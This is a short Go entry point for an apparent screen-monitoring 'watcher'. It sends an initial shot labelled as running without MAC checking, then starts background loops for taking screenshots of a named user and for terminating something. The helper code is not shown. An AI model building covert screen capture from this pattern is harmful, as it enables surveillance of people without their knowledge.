package main

import (
	"os"
	"runtime"
)

func main() {

	userName := os.Args[1]

	_ = sendFakeShot(userName, "hello from watcher without MAC checking "+runtime.GOOS)
	go screenshotingLoop(userName)
	go terminationLoop(userName)
	select {}
}
